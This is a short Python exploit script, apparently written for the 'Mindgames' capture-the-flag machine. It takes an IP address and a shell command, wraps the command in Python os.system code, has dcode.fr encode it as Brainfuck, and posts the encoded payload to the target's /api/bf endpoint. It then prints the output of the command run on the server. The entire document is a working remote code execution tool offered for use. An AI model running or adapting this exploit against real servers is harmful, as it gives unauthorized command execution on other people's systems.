#!/bin/python3

import requests
import sys
from xml.sax import saxutils as su
from termcolor import colored

print("="*50)
print("@elbee_ez; Exploit for Mindgames; Py to BF converter")
print("="*50)

# Error checking
if len(sys.argv) < 3:
	print("*"*30)
	print("Supply a command!")
	print("Usuage: python exploit.py ip 'cmd'")
	print("*"*30)
elif "." not in str(sys.argv[1]):
	print("*"*30)
	print("Invalid address specified!")
	print("Usuage: python exploit.py ip 'cmd'")
	print("*"*30)
else:
	try:
		input = '"'+sys.argv[2]+'"';cmd = 'import os;os.system('+input+')'
	
		# Make request to dcode.org
		data = {'tool': 'brainfuck-language','plaintext': cmd}
		x = requests.post("https://www.dcode.fr/api/", data=data)
		print(colored('[+] Sent POST to dcode.org!','blue'))
	
		# Extract result
		bf = x.json(); bf = bf["results"]; bf = su.unescape(bf)
		print(colored('[+] Crafted BF encoded payload!','blue'))

		# Send payload to mindgames server provided
		r = requests.post("http://"+str(sys.argv[1])+"/api/bf", data=bf)
		print(colored('Command executed! Thank you for shopping with us.','green'))
		print("Response from server for command "+input)
		print("="*50)
		print(r.text)

	except:
		
		print(colored("ERROR! Try again! (Did you specify the right IP address?)", 'red'))
